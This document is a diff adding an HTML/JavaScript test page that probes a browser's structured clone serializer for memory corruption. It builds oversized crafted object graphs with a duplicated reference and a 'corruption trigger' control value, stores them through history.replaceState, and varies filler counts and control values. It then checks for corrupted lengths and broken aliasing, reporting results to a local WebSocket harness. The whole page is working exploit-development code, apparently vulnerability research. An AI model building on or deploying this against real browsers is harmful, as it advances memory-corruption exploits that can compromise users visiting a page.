@@ -1,0 +1,226 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+<title>V590 — Structured Clone Corruption Test</title>
+</head><body>
+<pre id="log">V590: Structured Clone Index Corruption Test</pre>
+<script>
+var ws, logEl = document.getElementById('log');
+function log(msg) { logEl.textContent += '\n' + msg; }
+function beacon(data) {
+  data.v = '590';
+  try { if (ws && ws.readyState === 1) ws.send(JSON.stringify(data)); } catch(e) {}
+  log(data.phase + '/' + data.tag + ': ' + (data.msg || JSON.stringify(data)));
+}
+
+function run() {
+  // P1: Test basic structured clone aliasing via history.replaceState
+  try {
+    var ref = { marker: 0x51515151 };
+    var simple = [ref, ref]; // indices 0,1 should be same object
+    history.replaceState(simple, '');
+    var clone1 = history.state;
+    var aliasOK = clone1[0] === clone1[1];
+    beacon({phase:'P1',tag:'basic-alias',ok:aliasOK,msg:'basic alias=' + aliasOK + ',len=' + clone1.length});
+  } catch(e) {
+    beacon({phase:'P1',tag:'basic-alias',ok:false,msg:'ERR:' + e.message});
+  }
+
+  // P2: Build the Relapse-style filler graph to test pool index encoding
+  // Pool target: exactly 65534 objects + 2 arrays = 65536 pool entries
+  // Then referenceTarget gets pool index 65534, written as uint16
+  try {
+    var bigVal = 1n << 40n; // BigInt - NOT pooled
+    var fillerCount = 1; // non-legacy count
+    var fillerGraph = new Array(0xfffd); // 65533 elements
+    var pos = 0;
+    for (var i = 0; i < fillerCount; i++) fillerGraph[pos++] = bigVal + BigInt(i);
+    while (pos < fillerGraph.length) fillerGraph[pos++] = {};
+    // fillerGraph has: 1 BigInt + 65532 objects = 65532 pooled objects
+
+    beacon({phase:'P2',tag:'filler-built',ok:true,msg:'filler len=' + fillerGraph.length + ',objs=' + (fillerGraph.length - fillerCount)});
+  } catch(e) {
+    beacon({phase:'P2',tag:'filler-built',ok:false,msg:'ERR:' + e.message});
+    return;
+  }
+
+  // P3: Build outerGraph with referenceTarget at indices 1 and 2
+  try {
+    var CONTROL_INDEX = 0xffff;
+    var referenceTarget = { marker: 0x51515151 };
+    var outerGraph = new Array(CONTROL_INDEX + 1);
+    outerGraph[0] = fillerGraph;
+    outerGraph[1] = referenceTarget;
+    outerGraph[2] = referenceTarget; // DUPLICATE_INDEX = 2
+    outerGraph[CONTROL_INDEX] = -64000; // corruption trigger
+
+    beacon({phase:'P3',tag:'outer-built',ok:true,msg:'outerLen=' + outerGraph.length + ',ctrl=' + outerGraph[CONTROL_INDEX]});
+  } catch(e) {
+    beacon({phase:'P3',tag:'outer-built',ok:false,msg:'ERR:' + e.message});
+    return;
+  }
+
+  // P4: Store in history state
+  try {
+    history.replaceState(outerGraph, '');
+    beacon({phase:'P4',tag:'stored',ok:true,msg:'history.replaceState OK'});
+  } catch(e) {
+    beacon({phase:'P4',tag:'stored',ok:false,msg:'ERR:' + e.message});
+    return;
+  }
+
+  // P5: Retrieve and check for corruption
+  setTimeout(function() {
+    try {
+      var clone = history.state;
+      if (!clone) {
+        beacon({phase:'P5',tag:'retrieve',ok:false,msg:'clone is null/undefined'});
+        return;
+      }
+      var cloneLen = clone.length;
+      var expected = 0x50001; // 327681 - Relapse expected corrupted length
+      var corrupted = (cloneLen !== (CONTROL_INDEX + 1));
+
+      beacon({phase:'P5',tag:'length',ok:true,
+        msg:'cloneLen=' + cloneLen + ',expected_normal=' + (CONTROL_INDEX+1) + ',expected_corrupt=' + expected + ',corrupted=' + corrupted + ',isRelapse=' + (cloneLen === expected)});
+
+      // Check if clone[1] and clone[2] are the same object (alias preserved or broken)
+      var sameObj = (clone[1] === clone[2]);
+      beacon({phase:'P5',tag:'alias',ok:true,
+        msg:'same=' + sameObj + ',type1=' + typeof clone[1] + ',type2=' + typeof clone[2]});
+
+      // If objects are different, check their types
+      if (!sameObj) {
+        var t1 = clone[1], t2 = clone[2];
+        var info1 = 'null', info2 = 'null';
+        if (t1) {
+          if (t1 instanceof Uint8Array) info1 = 'Uint8Array(len=' + t1.length + ')';
+          else if (t1 instanceof ArrayBuffer) info1 = 'ArrayBuffer(len=' + t1.byteLength + ')';
+          else if (Array.isArray(t1)) info1 = 'Array(len=' + t1.length + ')';
+          else info1 = typeof t1 + '(' + Object.keys(t1).join(',') + ')';
+        }
+        if (t2) {
+          if (t2 instanceof Uint8Array) info2 = 'Uint8Array(len=' + t2.length + ')';
+          else if (t2 instanceof ArrayBuffer) info2 = 'ArrayBuffer(len=' + t2.byteLength + ')';
+          else if (Array.isArray(t2)) info2 = 'Array(len=' + t2.length + ')';
+          else info2 = typeof t2 + '(' + Object.keys(t2).join(',') + ')';
+        }
+        beacon({phase:'P5',tag:'types',ok:true,msg:'[1]=' + info1 + ',[2]=' + info2});
+      }
+
+      // Check clone[CONTROL_INDEX] value
+      var ctrlVal = clone[CONTROL_INDEX];
+      beacon({phase:'P5',tag:'ctrl',ok:true,msg:'ctrl=' + ctrlVal + ',type=' + typeof ctrlVal});
+
+      // Try varying filler BigInt counts (Relapse tries 2,4,6,7)
+      clone = null;
+    } catch(e) {
+      beacon({phase:'P5',tag:'retrieve',ok:false,msg:'ERR:' + e.message});
+    }
+
+    // P6: Test with different filler counts
+    var fillerCounts = [0, 1, 2, 4, 6, 7, 8, 16];
+    for (var fc = 0; fc < fillerCounts.length; fc++) {
+      testFillerCount(fillerCounts[fc], fc);
+    }
+  }, 200);
+}
+
+function testFillerCount(bigIntCount, idx) {
+  setTimeout(function() {
+    try {
+      var CONTROL_INDEX = 0xffff;
+      var fillerGraph = new Array(0xfffd);
+      var pos = 0;
+      var bigVal = 1n << 40n;
+      for (var i = 0; i < bigIntCount; i++) fillerGraph[pos++] = bigVal + BigInt(i);
+      while (pos < fillerGraph.length) fillerGraph[pos++] = {};
+
+      var referenceTarget = { marker: 0x52525252 };
+      var outerGraph = new Array(CONTROL_INDEX + 1);
+      outerGraph[0] = fillerGraph;
+      outerGraph[1] = referenceTarget;
+      outerGraph[2] = referenceTarget;
+      outerGraph[CONTROL_INDEX] = -64000;
+
+      history.replaceState(outerGraph, '');
+
+      setTimeout(function() {
+        try {
+          var clone = history.state;
+          var cloneLen = clone ? clone.length : -1;
+          var sameObj = clone ? (clone[1] === clone[2]) : false;
+          var t2type = 'n/a';
+          if (clone && clone[2]) {
+            if (clone[2] instanceof Uint8Array) t2type = 'U8A(' + clone[2].length + ')';
+            else if (clone[2] instanceof ArrayBuffer) t2type = 'AB(' + clone[2].byteLength + ')';
+            else if (Array.isArray(clone[2])) t2type = 'Arr(' + clone[2].length + ')';
+            else t2type = typeof clone[2];
+          }
+          beacon({phase:'P6',tag:'fc' + bigIntCount,ok:true,
+            msg:'bigInts=' + bigIntCount + ',len=' + cloneLen + ',same=' + sameObj + ',t2=' + t2type});
+          clone = null;
+        } catch(e) {
+          beacon({phase:'P6',tag:'fc' + bigIntCount,ok:false,msg:'ERR:' + e.message});
+        }
+      }, 100);
+    } catch(e) {
+      beacon({phase:'P6',tag:'fc' + bigIntCount,ok:false,msg:'BUILDERR:' + e.message});
+    }
+  }, idx * 300);
+}
+
+// P7: Test with different control values (not just -64000)
+setTimeout(function() {
+  var controlValues = [-64000, -32000, -1, 0, 1, 127, 255, 256, 65535];
+  for (var cv = 0; cv < controlValues.length; cv++) {
+    testControlValue(controlValues[cv], cv);
+  }
+}, 5000);
+
+function testControlValue(val, idx) {
+  setTimeout(function() {
+    try {
+      var CONTROL_INDEX = 0xffff;
+      var fillerGraph = new Array(0xfffd);
+      var pos = 0;
+      var bigVal = 1n << 40n;
+      fillerGraph[pos++] = bigVal;
+      while (pos < fillerGraph.length) fillerGraph[pos++] = {};
+
+      var referenceTarget = { marker: 0x53535353 };
+      var outerGraph = new Array(CONTROL_INDEX + 1);
+      outerGraph[0] = fillerGraph;
+      outerGraph[1] = referenceTarget;
+      outerGraph[2] = referenceTarget;
+      outerGraph[CONTROL_INDEX] = val;
+
+      history.replaceState(outerGraph, '');
+
+      setTimeout(function() {
+        try {
+          var clone = history.state;
+          var cloneLen = clone ? clone.length : -1;
+          var sameObj = clone ? (clone[1] === clone[2]) : false;
+          beacon({phase:'P7',tag:'cv' + val,ok:true,
+            msg:'ctrl=' + val + ',len=' + cloneLen + ',same=' + sameObj + ',corrupted=' + (cloneLen !== CONTROL_INDEX + 1)});
+          clone = null;
+        } catch(e) {
+          beacon({phase:'P7',tag:'cv' + val,ok:false,msg:'ERR:' + e.message});
+        }
+      }, 100);
+    } catch(e) {
+      beacon({phase:'P7',tag:'cv' + val,ok:false,msg:'BUILDERR:' + e.message});
+    }
+  }, idx * 300);
+}
+
+// Connect WS then run
+ws = new WebSocket('ws://'+location.hostname+':9090');
+ws.onopen = function() {
+  beacon({phase:'P0',tag:'ws',ok:true,msg:'connected'});
+  setTimeout(run, 100);
+};
+ws.onerror = function() { log('WS error, running offline'); setTimeout(run, 100); };
+</script>
+</body></html>
